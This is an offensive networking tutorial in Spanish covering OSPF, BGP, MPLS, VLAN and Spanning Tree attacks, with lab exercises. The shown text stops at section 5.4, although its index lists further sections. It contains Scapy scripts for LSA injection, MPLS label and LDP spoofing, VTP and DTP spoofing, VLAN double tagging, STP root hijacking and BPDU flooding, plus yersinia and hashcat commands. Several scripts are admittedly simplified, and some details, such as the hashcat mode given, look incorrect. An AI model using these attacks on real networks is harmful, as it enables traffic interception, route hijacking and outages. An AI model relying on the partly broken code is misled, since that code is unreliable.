# 🌐 Redes Avanzadas para Hacking

> ⏱️ **Tiempo estimado:** 15 horas (~3 sesiones) (2214 lineas)


> **Versión:** 1.0  
> **Idioma:** Español (argentino) — informal, directo, para la comunidad  
> **Nivel:** Avanzado  
> **Duración estimada:** 3–4 semanas leyendo y practicando

---

## 📚 Índice

1. [Introducción](#1-introducción)
2. [Routing Protocols](#2-routing-protocols)
    - 2.1 [OSPF — LSA Types, Areas, Authentication](#21-ospf--lsa-types-areas-authentication)
    - 2.2 [BGP — AS Path, Communities, MED, Local Pref, Route Hijacking](#22-bgp--as-path-communities-med-local-pref-route-hijacking)
    - 2.3 [Ejercicios prácticos](#23-ejercicios-prácticos)
3. [MPLS](#3-mpls)
    - 3.1 [Label Switching y LDP](#31-label-switching-y-ldp)
    - 3.2 [MPLS VPN (L3VPN, L2VPN)](#32-mpls-vpn-l3vpn-l2vpn)
    - 3.3 [MPLS-TE y Segment Routing](#33-mpls-te-y-segment-routing)
    - 3.4 [MPLS Attacks](#34-mpls-attacks)
    - 3.5 [Ejercicios prácticos](#35-ejercicios-prácticos)
4. [VLANs](#4-vlans)
    - 4.1 [802.1Q Trunking](#41-8021q-trunking)
    - 4.2 [VTP — Advertising y Exploitation](#42-vtp--advertising-y-exploitation)
    - 4.3 [DTP — Dynamic Trunking Protocol](#43-dtp--dynamic-trunking-protocol)
    - 4.4 [VLAN Hopping — Switch Spoofing, Double Tagging](#44-vlan-hopping--switch-spoofing-double-tagging)
    - 4.5 [Ejercicios prácticos](#45-ejercicios-prácticos)
5. [Spanning Tree](#5-spanning-tree)
    - 5.1 [STP, RSTP, MSTP](#51-stp-rstp-mstp)
    - 5.2 [Manipulación de STP](#52-manipulación-de-stp)
    - 5.3 [BPDU Attacks y Root Bridge Hijacking](#53-bpdu-attacks-y-root-bridge-hijacking)
    - 5.4 [Ejercicios prácticos](#54-ejercicios-prácticos)
6. [VPN Protocols](#6-vpn-protocols)
    - 6.1 [IPsec — IKEv1 vs IKEv2, Main/Aggressive Mode, NAT-T](#61-ipsec--ikev1-vs-ikev2-mainaggressive-mode-nat-t)
    - 6.2 [WireGuard — Crypto, Handshake, Roaming](#62-wireguard--crypto-handshake-roaming)
    - 6.3 [OpenVPN — TAP vs TUN, Ciphers, Auth](#63-openvpn--tap-vs-tun-ciphers-auth)
    - 6.4 [L2TP y PPTP](#64-l2tp-y-pptp)
    - 6.5 [Ejercicios prácticos](#65-ejercicios-prácticos)
7. [GRE Tunnels](#7-gre-tunnels)
    - 7.1 [Encapsulación GRE](#71-encapsulación-gre)
    - 7.2 [GRE over IPsec](#72-gre-over-ipsec)
    - 7.3 [Multipoint GRE y NHRP](#73-multipoint-gre-y-nhrp)
    - 7.4 [mGRE Attacks y DMVPN](#74-mgre-attacks-y-dmvpn)
    - 7.5 [Ejercicios prácticos](#75-ejercicios-prácticos)
8. [Network Segmentation](#8-network-segmentation)
    - 8.1 [ACLs](#81-acls)
    - 8.2 [VRF](#82-vrf)
    - 8.3 [Zone-Based Firewalls](#83-zone-based-firewalls)
    - 8.4 [Policy-Based Routing](#84-policy-based-routing)
    - 8.5 [Ejercicios prácticos](#85-ejercicios-prácticos)
9. [QoS](#9-qos)
    - 9.1 [Classification y Marking](#91-classification-y-marking)
    - 9.2 [Policing, Shaping, Queuing](#92-policing-shaping-queuing)
    - 9.3 [QoS Attacks — Starvation](#93-qos-attacks--starvation)
    - 9.4 [Ejercicios prácticos](#94-ejercicios-prácticos)
10. [IPv6](#10-ipv6)
    - 10.1 [Address Types](#101-address-types)
    - 10.2 [SLAAC vs DHCPv6](#102-slaac-vs-dhcpv6)
    - 10.3 [Neighbor Discovery Protocol](#103-neighbor-discovery-protocol)
    - 10.4 [NDP Attacks — SLAAC, RA Spoofing, Neighbor Cache Exhaustion](#104-ndp-attacks--slaac-ra-spoofing-neighbor-cache-exhaustion)
    - 10.5 [Ejercicios prácticos](#105-ejercicios-prácticos)
11. [NetFlow / sFlow](#11-netflow--sflow)
    - 11.1 [Flow Monitoring Concepts](#111-flow-monitoring-concepts)
    - 11.2 [Network Telemetry](#112-network-telemetry)
    - 11.3 [Flow Analysis for Attack Detection](#113-flow-analysis-for-attack-detection)
    - 11.4 [Flow Manipulation](#114-flow-manipulation)
    - 11.5 [Ejercicios prácticos](#115-ejercicios-prácticos)
12. [SDN](#12-sdn)
    - 12.1 [OpenFlow Protocol](#121-openflow-protocol)
    - 12.2 [Controller Exploitation](#122-controller-exploitation)
    - 12.3 [Flow Table Manipulation](#123-flow-table-manipulation)
    - 12.4 [SDN Security](#124-sdn-security)
    - 12.5 [Ejercicios prácticos](#125-ejercicios-prácticos)
13. [Apéndice A — Comandos Rápidos](#13-apéndice-a--comandos-rápidos)
14. [Apéndice B — Herramientas](#14-apéndice-b--herramientas)
15. [Apéndice C — Glosario](#15-apéndice-c--glosario)

---

## 1. Introducción

Las [redes](../raw/r3d3s-f0nd4m3nt0s.md) son el medio por el que viajan todos los ataques. No importa si estás explotando una web, moviéndote lateralmente en un [ad](../raw/w1nd0ws-d0m41n-4dm1n.md), o haciendo [mitm](../raw/m1tm-m0b1l3.md) — estás operando sobre una [red](../raw/r3d3s-f0nd4m3nt0s.md). Entender cómo funcionan los protocolos de [red](../raw/r3d3s-f0nd4m3nt0s.md) a nivel avanzado te da una ventaja enorme.

Este tutorial cubre protocolos de red desde una perspectiva OFENSIVA. No vamos a explicar qué es una [vlan](../raw/r3d3s-f0nd4m3nt0s.md#vlan) (eso es básico). Vamos a explicar cómo saltarte una [vlan](../raw/r3d3s-f0nd4m3nt0s.md#vlan), cómo secuestrar un [bGP](../raw/r3d3s-4v4nz4d4s.md#bgp), cómo manipular STP, cómo romper IPsec, y cómo explotar [sdn](../raw/r3d3s-4v4nz4d4s.md#sdn).

### ¿Qué necesitás?

- GNS3 o EVE-NG para simular redes
- Cisco [ios](../raw/10s-p3nt3st1ng.md)/[ios](../raw/10s-p3nt3st1ng.md)-XE images (o alternativas como FRR, VyOS)
- [wireshark](../raw/r3d3s-f0nd4m3nt0s.md#wireshark) para analizar protocolos
- Ganas de romper infraestructura de red

### Convenciones

```
# Comandos de configuración Cisco (IOS)
Router> enable
Router# configure terminal
Router(config)# ...

# Comandos Linux
$ ip route show
$ tcpdump -i eth0

# Comandos de ataque
# python3 exploit.py
```

Arrancamos.

---

## 2. Routing Protocols

### 2.1 [ospf](../raw/r3d3s-4v4nz4d4s.md#ospf) — LSA Types, Areas, Authentication

OSPF (Open Shortest Path First) es un [protocolo](../raw/r3d3s-f0nd4m3nt0s.md#protocolos-de-red)) de routing link-state. Cada [router](../raw/r3d3s-f0nd4m3nt0s.md#routers) conoce la topología completa.

#### LSA Types

| Type | Name | Description |
|------|------|-------------|
| 1 | Router LSA | Información de interfaces del router |
| 2 | Network LSA | Información de segmentos multiacceso (DR) |
| 3 | Summary LSA | Rutas resumidas entre áreas |
| 4 | ASBR Summary LSA | Cómo llegar a un ASBR |
| 5 | AS External LSA | Rutas externas (redistribuidas) |
| 6 | Group Membership LSA | MOSPF (obsoleto) |
| 7 | NSSA External LSA | Rutas externas en áreas NSSA |
| 8 | External Attributes LSA | [bGP](../raw/r3d3s-4v4nz4d4s.md#bgp) |
| 9-11 | Opaque LSA | Extensiones (TE, Graceful Restart) |

#### Áreas OSPF

```
Área 0 (Backbone)
    |
    ├── Área 1 (Normal)
    ├── Área 2 (Stub) — solo LSA 1, 2, 3 (no LSA 4, 5)
    ├── Área 3 (Totally Stubby) — solo LSA 1, 2 (default route)
    └── Área 4 (NSSA) — permite LSA 7 para rutas externas
```

#### Configuración Básica OSPF

```cisco
! Configurar OSPF en área 0
router ospf 1
  router-id 1.1.1.1
  network 192.168.1.0 0.0.0.255 area 0
  network 10.0.0.0 0.0.0.255 area 0

! Configurar OSPF con autenticación MD5
interface GigabitEthernet0/0
  ip ospf authentication message-digest
  ip ospf message-digest-key 1 md5 M1Cl4v3S3cr3t4

! Verificar
show ip ospf neighbor
show ip ospf database
show ip route ospf
show ip protocols
```

#### Ataques a OSPF

**1. Falsificación de LSA (OSPF Spoofing)**

Si un atacante puede inyectar LSA falsas, puede redirigir tráfico.

```python
#!/usr/bin/env python3
# OSPF LSA injection usando Scapy
from scapy.all import *
import struct

def inject_ospf_lsa(iface, target_ip, fake_network, fake_mask, fake_metric):
    # Construir un paquete OSPF falso
    ip = IP(src=target_ip, dst="224.0.0.5")  # 224.0.0.5 = AllSPFRouters
    ospf_hdr = OSPF_Hdr(src=target_ip, area=0, authtype=1)
    
    # LSA Router falsa
    lsa = OSPF_LSA(  # OJO: esto es conceptual, la implementación real necesita más campos
        type=1,
        link_state_id=target_ip,
        advertising_router=target_ip,
        age=1,
        seq=0x80000001
    )
    
    send(ip/ospf_hdr/lsa, iface=iface)

# Mejor: usar herramientas especializadas
# https://github.com/russhousley/OSPF-attacks
```

```bash
# Herramienta: ospf-spoof
ospf-spoof --interface eth0 --router-id 2.2.2.2 --network 10.0.0.0/16
```

**2. OSPF Authentication Attack**

Si la autenticación es débil (texto plano) o no existe:

```bash
# Capturar hashes OSPF
tcpdump -i eth0 -X -v -c 100 proto 89

# Si usa MD5, es vulnerable a ataques de diccionario
# Usar john o hashcat contra los hashes MD5 de OSPF
```

**3. Área 0 Exposure**

Si un atacante se conecta al área 0, ve TODA la topología.

```bash
# Conectarse a un switch que tiene acceso al área 0
# Configurar OSPF en el router del atacante
# Recibir toda la LSDB
```

### 2.2 BGP — AS Path, Communities, MED, Local Pref, Route Hijacking

BGP (Border Gateway Protocol) es el protocolo de routing de internet. Controla cómo viajan los paquetes entre AS (Autonomous Systems).

#### Atributos BGP

| Atributo | Descripción | Uso en Ataques |
|----------|-------------|----------------|
| AS_PATH | Lista de AS recorridos | Prevenir detección de route hijacking |
| NEXT_HOP | [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) del próximo salto | Redirección de tráfico |
| LOCAL_PREF | Preferencia dentro del AS (mayor = mejor) | Atraer tráfico |
| MED | Preferencia entre AS (menor = mejor) | Influenciar path selection |
| COMMUNITIES | Tags para políticas | Manipulación de routing |
| ORIGIN | Cómo se originó la ruta | Manipulación de trust |

#### Configuración Básica BGP

```cisco
! iBGP (interno al AS)
router bgp 65000
  bgp router-id 1.1.1.1
  neighbor 10.0.0.2 remote-as 65000
  neighbor 10.0.0.2 update-source Loopback0
  network 192.168.1.0 mask 255.255.255.0

! eBGP (entre AS)
router bgp 65000
  neighbor 203.0.113.1 remote-as 65001
  neighbor 203.0.113.1 password M1Cl4v3BGP
```

#### Route Hijacking

El route hijacking (o BGP hijacking) ocurre cuando un AS anuncia rutas que no le pertenecen.

**Tipos de Hijacking:**

1. **Subprefix hijacking:** Anunciás un prefijo más específico que el legítimo (ej: /24 vs /23). Por longest prefix match, ganás.
2. **AS path prepending manipulation:** Manipulás el AS path para hacer tu ruta más atractiva.
3. **Type 0 hijacking:** Anunciás el mismo prefijo sin modificar el AS path original.

```bash
# Simular BGP Hijacking (en laboratorio)
# 1. El atacante (AS 65002) anuncia 203.0.113.0/24
# 2. El legítimo (AS 65001) también anuncia 203.0.113.0/24
# 3. Si el atacante anuncia 203.0.113.0/25 (más específico), gana

# Configuración del atacante:
router bgp 65002
  network 203.0.113.0 mask 255.255.255.128  # /25
```

#### BGP RPKI (Resource Public Key Infrastructure)

```bash
# RPKI valida que un AS tiene derecho a anunciar un prefijo
# ROA (Route Origin Authorization) = registro de autorización

# Verificar RPKI de un prefijo
https://rpki.cloudflare.com/?prefix=203.0.113.0/24

# Si el prefijo tiene ROA inválido, el hijacking es más detectable
```

#### BGP Communities Manipulation

Las communities son tags que los AS usan para aplicar políticas. Si podés manipularlas:

```bash
# Community típicas:
# 65000:80 — Prepend 1x AS path
# 65000:90 — Prepend 2x AS path
# 65000:130 — No export to peers
# 65000:150 — No export to upstream
# 65001:666 — Blackhole (dropear tráfico)

# Configurar community maliciosa:
route-map SET_COMMUNITY permit 10
  set community 65000:666  # Blackhole
  set community 65001:80   # Prepending
```

#### BGP Leak

```bash
# Un BGP leak ocurre cuando un AS anuncia rutas iBGP a sus peers eBGP
# Esto puede ser accidental o malicioso

# Prevención: filter-list, prefix-list, route-map
```

### 2.3 Ejercicios prácticos

**Ejercicio 1:** Configurá OSPF en GNS3 con 3 routers en área 0. Agregá un router en área 1 (stub). Verificá las LSA con `show ip ospf database`.

**Ejercicio 2:** Inyectá una LSA falsa en OSPF usando Scapy. Verificá que los routers vecinos la aceptan.

**Ejercicio 3:** Configurá BGP entre 3 AS en GNS3. Simulá un route hijacking: hacé que AS 65002 anuncie un prefijo de AS 65001.

**Ejercicio 4:** Implementá RPKI en tu lab. Verificá que el hijacking es detectado.

**Ejercicio 5:**
Configurá BGP communities para que un AS no exporte rutas a un peer específico. Verificá con `show ip bgp community`.

---

## 3. MPLS

### 3.1 Label Switching y LDP

MPLS (Multiprotocol Label Switching) reemplaza el routing [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) tradicional con switching basado en etiquetas.

#### Conceptos Básicos

- **LSR (Label Switching [router](../raw/r3d3s-f0nd4m3nt0s.md#routers)):** [router](../raw/r3d3s-f0nd4m3nt0s.md#routers) MPLS
- **LER (Label Edge Router):** Router de borde MPLS
- **LSP (Label Switched Path):** Camino de etiquetas
- **FEC (Forwarding Equivalence Class):** Grupo de paquetes que reciben el mismo tratamiento
- **Label:** 20 bits (más 3 bits EXP, 1 S, 8 TTL)

#### Cómo Funciona LDP (Label Distribution Protocol)

1. LDP descubre vecinos ([udp](../raw/r3d3s-f0nd4m3nt0s.md#udp) 646, multicast 224.0.0.2)
2. Intercambia capacidades de label
3. Asigna labels a cada FEC
4. Distribuye labels a vecinos

```cisco
! Configurar MPLS en Cisco
ip cef
mpls ip
mpls label protocol ldp

interface GigabitEthernet0/0
  mpls ip

! Verificar
show mpls ldp neighbor
show mpls ldp bindings
show mpls forwarding-table
show mpls interfaces
```

#### Etiquetas MPLS

```bash
# Estructura de una etiqueta MPLS
# 0                   1                   2                   3
# 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
# +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
# |                Label                 | TC  |S|       TTL     |
# +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
# Label: 20 bits
# TC (Traffic Class): 3 bits (antes EXP)
# S (Bottom of Stack): 1 bit
# TTL: 8 bits
```

### 3.2 MPLS [vpn](../raw/4n0n1m4t0.md#vpn) (L3VPN, L2VPN)

#### L3VPN (RFC 4364)

En L3VPN, el provider edge ([pe](../raw/w1n-1nt3rn4ls.md#pe)) router participa en el routing del cliente.

```cisco
! Configuración L3VPN

! VRF (Virtual Routing and Forwarding)
ip vrf CLIENTE_A
  rd 65000:100
  route-target export 65000:100
  route-target import 65000:100

! Interface de cliente
interface GigabitEthernet0/1
  ip vrf forwarding CLIENTE_A
  ip address 192.168.1.1 255.255.255.0

! BGP para VPNv4
router bgp 65000
  neighbor 10.0.0.2 remote-as 65000
  neighbor 10.0.0.2 update-source Loopback0
  address-family vpnv4
    neighbor 10.0.0.2 activate
    neighbor 10.0.0.2 send-community extended
  address-family ipv4 vrf CLIENTE_A
    redistribute connected
```

#### L2VPN (VPWS, VPLS, EVPN)

L2VPN extiende la capa 2 a través del backbone MPLS.

```cisco
! Pseudowire (VPWS — Virtual Private Wire Service)
interface pseudowire 100
  encapsulation mpls
  neighbor 10.0.0.2 100

! VPLS (Virtual Private LAN Service)
l2 vfi VPLS_A manual
  vpn id 100
  neighbor 10.0.0.2 encapsulation mpls
  neighbor 10.0.0.3 encapsulation mpls
```

#### EVPN (Ethernet VPN)

EVPN es el estándar moderno (reemplaza VPLS).

```bash
# EVPN usa MP-BGP para distribuir información de MAC
# Ventajas: split-horizon, aliasing, balanceo de carga
# Desventajas: más complejo de configurar
```

### 3.3 MPLS-TE y Segment Routing

#### MPLS-TE (Traffic Engineering)

MPLS-TE permite controlar EXACTAMENTE por dónde va el tráfico.

```cisco
! Configurar MPLS-TE
mpls traffic-eng tunnels

interface Tunnel100
  ip unnumbered Loopback0
  tunnel mode mpls traffic-eng
  tunnel destination 10.0.0.2
  tunnel mpls traffic-eng autoroute announce

! RSVP para señalización
interface GigabitEthernet0/0
  mpls traffic-eng tunnels
  ip rsvp bandwidth 100000

! Verificar
show mpls traffic-eng tunnels
show mpls traffic-eng topology
```

#### Segment Routing (SR-MPLS)

Segment Routing simplifica MPLS-TE usando segmentos (labels) que el origen especifica.

```cisco
! Configurar Segment Routing
segment-routing mpls
  connected-prefix-sid-map
    address-family ipv4
      10.0.0.1/32 index 1
      10.0.0.2/32 index 2

interface GigabitEthernet0/0
  segment-routing mpls

! Verificar
show segment-routing mpls connected-prefix-sid-map
show segment-routing mpls forwarding
```

### 3.4 MPLS Attacks

#### Label Spoofing

Si un atacante puede inyectar paquetes MPLS con labels específicas, puede evadir ACLs y firewalls.

```python
#!/usr/bin/env python3
from scapy.all import *

def send_mpls_packet(target_ip, label, payload="HELLO"):
    pkt = IP(dst=target_ip) / MPLS(label=label, cos=0, s=1, ttl=64) / Raw(load=payload)
    send(pkt)

# Si el router de borde acepta paquetes MPLS entrantes (mpls ip en la interfaz WAN),
# podés inyectar tráfico directamente al LSP
send_mpls_packet("10.0.0.1", 100, b"SECRET_DATA")
```

#### LDP Spoofing

```python
from scapy.contrib.mpls import MPLS

def ldp_spoof(iface, target_ip, fake_label, prefix):
    # LDP usa UDP 646, TCP 646
    # Enviar LDP Hello falso
    ip = IP(src=target_ip, dst="224.0.0.2")
    udp = UDP(sport=646, dport=646)
    ldp_hello = b"\x00\x00\x00\x14"  # LDP Hello header (simplificado)
    send(ip/udp/ldp_hello, iface=iface)
```

#### MPLS VPN Escape

Si un atacante está en una VRF, puede intentar llegar a otras VRFs o a la [red](../raw/r3d3s-f0nd4m3nt0s.md) global.

```bash
# 1. Verificar si hay route leaking
traceroute 10.0.0.1   # Si responde, hay leaking

# 2. Probar IP options
ping -R 10.0.0.1  # Record route

# 3. Probar encapsulation
# Si el router acepta paquetes con labels MPLS, podés saltar VRFs
```

#### Ataque a Segment Routing

```bash
# Si el SRGB (Segment Routing Global Block) es predecible,
# podés adivinar SIDs y manipular paths

# Verificar SIDs distribuidos via IGP
tcpdump -i eth0 -v proto 89  # OSPF lleva SR SIDs
```

### 3.5 Ejercicios prácticos

**Ejercicio 1:** Configurá MPLS con LDP entre 3 routers en GNS3. Verificá las labels con `show mpls forwarding-table`.

**Ejercicio 2:** Agregá una L3VPN con VRF. Verificá que los clientes en diferentes sitios pueden comunicarse.

**Ejercicio 3:** Implementá MPLS-TE con un tunnel que fuerce el tráfico por un camino específico.

**Ejercicio 4:** Simulá un label spoofing: inyectá un paquete MPLS desde afuera del dominio MPLS. ¿El router de borde lo acepta?

**Ejercicio 5:** Convertí la configuración a Segment Routing. Usá ping con SIDs específicos.

---

## 4. VLANs

### 4.1 802.1Q Trunking

802.1Q es el estándar para trunking [vlan](../raw/r3d3s-f0nd4m3nt0s.md#vlan). Agrega un tag de 4 bytes a la trama Ethernet.

```bash
# Estructura de una trama 802.1Q
# +--------+--------+--------+--------+
# | TPID   | PRI    | CFI    |  VID   |
# +--------+--------+--------+--------+
# TPID: 0x8100 (Tag Protocol Identifier)
# PRI: 3 bits (802.1p priority)
# CFI: 1 bit (Canonical Format Indicator)
# VID: 12 bits (VLAN ID, 0-4095)
```

```cisco
! Configurar trunk en switch Cisco
interface GigabitEthernet0/1
  switchport mode trunk
  switchport trunk allowed vlan 10,20,30,100
  switchport trunk native vlan 99

! Verificar
show interfaces trunk
show interfaces gigabitEthernet 0/1 switchport
```

### 4.2 VTP — Advertising y Exploitation

VTP (VLAN Trunking Protocol) distribuye información de VLANs entre switches.

#### Cómo funciona VTP

- VTP Server: Crea/modifica/elimina VLANs
- VTP Client: Recibe y aplica VLANs (no puede crear)
- VTP Transparent: Pasa VTP pero no participa

```cisco
! Configurar VTP
vtp domain HACKERLAB
vtp password M1Cl4v3VTP
vtp mode server

! Verificar
show vtp status
show vtp password
```

#### Ataques a VTP

**1. VTP Advertisement Attack**

Si conocés el dominio y password (o no hay password), podés inyectar VLANs falsas.

```python
#!/usr/bin/env python3
from scapy.all import *

def vtp_inject(iface, vtp_domain, vlan_id, vlan_name="HACKED"):
    # Construir paquete VTP
    # Destination MAC: 01-00-0C-CC-CC-CC (VTP multicast)
    
    dmac = "01:00:0c:cc:cc:cc"
    smac = "00:11:22:33:44:55"
    
    # 802.1Q trunk (VLAN 1 nativa)
    dot1q = Dot1Q(vlan=1)
    
    # LLC para VTP
    llc = LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03)
    snap = SNAP(OUI=0x00000c, code=0x2003)
    
    # VTP header
    # Versión 1, Summary Advertisement
    vtp = b"\x01"  # Version
    vtp += b"\x01"  # Code (Summary Adv)
    vtp += b"\x00"  # Followers
    vtp += b"\x00\x00\x00"  # Domain length + domain (simplificado)
    
    pkt = Ether(dst=dmac, src=smac) / dot1q / llc / snap / Raw(vtp)
    sendp(pkt, iface=iface, loop=1, inter=0.1)
```

```bash
# Herramienta: yersinia (ataque VTP)
yersinia vtp -attackMode 1 -interface eth0  # Modo 1 = VTP advertising
```

**2. VTP Password [cracking](../raw/p4ssw0rd-4tt4cks.md#cracking-de-contrasenas)**

```bash
# Capturar hash VTP (MD5 del dominio + password)
tcpdump -i eth0 -X -c 100 ether host 01:00:0c:cc:cc:cc

# Extraer el hash MD5 de VTP y crackear con hashcat
hashcat -m 100 vtp_hash.txt rockyou.txt
```

### 4.3 DTP — Dynamic Trunking Protocol

DTP negocia automáticamente el modo trunk entre switches.

#### Modos DTP

- **Dynamic desirable:** Activamente intenta ser trunk
- **Dynamic auto:** Espera a que el otro inicie
- **Trunk:** Siempre trunk
- **Access:** Siempre access

```cisco
! DTP por defecto (Dynamic Desirable/Auto según modelo)
interface GigabitEthernet0/1
  switchport mode dynamic desirable
  switchport mode dynamic auto
```

#### Ataque DTP ([switch](../raw/r3d3s-f0nd4m3nt0s.md#switches) Spoofing)

Si DTP está habilitado, un atacante puede negociar un trunk y recibir tráfico de TODAS las VLANs.

```python
#!/usr/bin/env python3
from scapy.all import *

def dtp_switch_spoof(iface):
    # DTP uses multicast 01-00-0C-CC-CC-CC
    dmac = "01:00:0c:cc:cc:cc"
    smac = "00:11:22:33:44:55"
    
    # DTP frame (DTP Desirable)
    dtp_pkt = b"\x01"  # Version
    dtp_pkt += b"\x00"  # Code (0x00 = Negotiation)
    dtp_pkt += b"\x00\x00"  # Reserved
    
    # 802.1Q (VLAN 1)
    dot1q = Dot1Q(vlan=1)
    
    # LLC
    llc = LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03)
    snap = SNAP(OUI=0x00000c, code=0x2004)  # DTP
    
    pkt = Ether(dst=dmac, src=smac) / dot1q / llc / snap / Raw(dtp_pkt)
    sendp(pkt, iface=iface, loop=1, inter=3)
```

```bash
# Con yersinia
yersinia dtp -attackMode 1 -interface eth0
```

### 4.4 VLAN Hopping — Switch Spoofing, Double Tagging

#### Switch Spoofing

```bash
# Ya cubierto en DTP attack
# Configurar la interfaz del atacante como trunk
# Recibir tráfico de todas las VLANs

# En Linux, configurar interfaz trunk:
modprobe 8021q
vconfig add eth0 10  # Agregar VLAN 10
ip link set eth0.10 up
tcpdump -i eth0.10  # Ver tráfico de VLAN 10
```

#### Double Tagging

El double tagging explota que algunos switches no verifican si una trama ya tiene tag 802.1Q.

```bash
# Escenario: Switch 1 (VLAN 10 nativa) -> Switch 2 (VLAN 20 nativa)
# El atacante envía una trama con DOBLE tag:
# - Outer tag: VLAN 10 (la nativa del trunk)
# - Inner tag: VLAN 20 (la VLAN objetivo)

# Al llegar a Switch 1, el outer tag (VLAN 10) se remueve (es nativa)
# La trama ahora solo tiene tag VLAN 20
# Switch 1 la envía por el trunk (sin tag nativo)
# Switch 2 la recibe con tag VLAN 20 y la entrega
```

```python
#!/usr/bin/env python3
from scapy.all import *

def double_tagging(iface, target_mac, outer_vlan, inner_vlan):
    # Outer tag: VLAN nativa
    # Inner tag: VLAN objetivo
    
    pkt = (Ether(dst=target_mac, src="00:11:22:33:44:55") /
           Dot1Q(vlan=outer_vlan) /  # Outer tag (se remueve al entrar)
           Dot1Q(vlan=inner_vlan) /  # Inner tag (llega al destino)
           IP(dst="192.168.20.10") /
           ICMP())
    
    sendp(pkt, iface=iface)
```

#### Defensa contra VLAN Hopping

```cisco
! Deshabilitar DTP
interface GigabitEthernet0/1
  switchport mode access
  switchport nonegotiate  ! No enviar DTP frames

! Configurar la VLAN nativa explícitamente
interface GigabitEthernet0/1
  switchport trunk native vlan 999  ! VLAN no utilizada

! Deshabilitar trunking en puertos de acceso
switchport host
```

### 4.5 Ejercicios prácticos

**Ejercicio 1:** Configurá 2 switches con trunk 802.1Q. Creá VLANs 10, 20, 30. Verificá conectividad entre hosts en la misma VLAN.

**Ejercicio 2:** Simulá switch spoofing: conectá un atacante y negociá un trunk usando DTP. Capturá tráfico de diferentes VLANs.

**Ejercicio 3:** Simulá double tagging: desde VLAN 10, enviá una trama a VLAN 20 usando double tag.

**Ejercicio 4:** Implementá defensas contra VLAN hopping: deshabilitá DTP, cambiá VLAN nativa, configurá switchport nonegotiate.

**Ejercicio 5:** Capturá y analizá tráfico VTP con [wireshark](../raw/r3d3s-f0nd4m3nt0s.md#wireshark). Extraé el [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions) VTP. Crackerlo con [hashcat](../raw/p4ssw0rd-4tt4cks.md#hashcat).

---

## 5. Spanning Tree

### 5.1 STP, RSTP, MSTP

#### STP (802.1D)

STP (Spanning Tree Protocol) previene loops en [redes](../raw/r3d3s-f0nd4m3nt0s.md) con switches redundantes.

```bash
# Estados de puerto STP:
# Blocking -> Listening -> Learning -> Forwarding
# En caso de fallo: la reconvergencia toma 30-50 segundos

# BPDU (Bridge Protocol Data Unit)
# Root Bridge ID, Root Path Cost, Bridge ID, Port ID, Timer values
```

```cisco
! Configuración STP Básica
spanning-tree mode pvst  ! Per-VLAN Spanning Tree
spanning-tree vlan 1 priority 4096  ! Forzar este switch como root

! Verificar
show spanning-tree
show spanning-tree vlan 1
show spanning-tree detail
```

#### RSTP (802.1w)

```bash
# Estados: Discarding, Learning, Forwarding
# Reconvergencia: ~1-3 segundos
# Roles: Root, Designated, Alternate, Backup
```

```cisco
spanning-tree mode rapid-pvst
```

#### MSTP (802.1s)

```bash
# Multiple Spanning Tree: agrupa VLANs en "instancias"
# Cada instancia tiene su propio spanning tree
```

```cisco
spanning-tree mode mst
spanning-tree mst configuration
  name HACKERLAB
  revision 1
  instance 1 vlan 1-100
  instance 2 vlan 101-200
```

### 5.2 Manipulación de STP

#### Forzar Root Bridge

```bash
# Si un atacante envía BPDUs con bridge priority más baja (mejor),
# se convierte en root bridge y ve tráfico de toda la red

# En Linux:
# Usar el comando brctl o directamente con Scapy
```

```python
#!/usr/bin/env python3
from scapy.all import *

def stp_root_hijack(iface):
    # Destination MAC for STP: 01:80:C2:00:00:00
    dmac = "01:80:c2:00:00:00"
    smac = "00:11:22:33:44:55"
    
    # STP Configuration BPDU
    # Root Bridge Priority: 0 (más bajo posible)
    # Bridge Priority: 0
    # Root Path Cost: 0
    
    stp = b"\x00"  # Protocol ID
    stp += b"\x00"  # Version
    stp += b"\x00"  # BPDU type (Configuration)
    stp += b"\x01"  # BPDU flags
    stp += b"\x00\x00"  # Root ID Priority (0)
    stp += b"\x00\x11\x22\x33\x44\x55"  # Root ID MAC
    stp += b"\x00\x00"  # Path Cost (0)
    stp += b"\x00\x00"  # Bridge ID Priority (0)
    stp += b"\x00\x11\x22\x33\x44\x55"  # Bridge ID MAC
    stp += b"\x00\x00"  # Port ID
    stp += b"\x00\x00"  # Message age
    stp += b"\x00\x00"  # Max age
    stp += b"\x00\x00"  # Hello time
    stp += b"\x00\x00"  # Forward delay
    
    pkt = Ether(dst=dmac, src=smac) / LLC(dsap=0x42, ssap=0x42, ctrl=0x03) / Raw(stp)
    sendp(pkt, iface=iface, loop=1, inter=2)
```

```bash
# Alternativa: yersinia
yersinia stp -attackMode 1 -interface eth0  # Modo 1 = become root bridge
```

### 5.3 BPDU Attacks y Root Bridge Hijacking

#### BPDU Flooding

Enviar muchas BPDUs con diferentes bridge [ids](../raw/s3c-f0nd4m3nt0s.md#ids-ips)) para forzar recálculos constantes.

```python
def bpdu_flood(iface, count=1000):
    for i in range(count):
        smac = f"00:11:22:{i>>16:02x}:{(i>>8)&0xff:02x}:{i&0xff:02x}"
        # BPDU falso
        stp = b"\x00\x00\x00\x00" + b"\x00" * 31
        pkt = Ether(dst="01:80:c2:00:00:00", src=smac) / LLC(dsap=0x42, ssap=0x42, ctrl=0x03) / Raw(stp)
        sendp(pkt, iface=iface)
```

#### BPDU Guard y BPDU Filter

```cisco
! Defensa contra BPDU attacks

! BPDU Guard: deshabilita el puerto si recibe una BPDU
interface GigabitEthernet0/1
  spanning-tree bpduguard enable

! BPDU Filter: ignora BPDUs en el puerto
interface GigabitEthernet0/2
  spanning-tree bpdufilter enable
```

#### Root Guard

```cisco
! Root Guard: si el puerto recibe una BPDU superior, lo pone en inconsistent state
interface GigabitEthernet0/1
  spanning-tree guard root
```

### 5.4 Ejercicios prácticos

**Ejercicio 1:** Configurá STP en GNS3 con 3 switches en triángulo. Identificá el root bridge, los designated ports, y los blocking ports.

**Ejercicio 2:** Simulá un root bridge hijacking: desde un atacante enviá BPDUs con priority más baja. Verificá que el root bridge cambia.

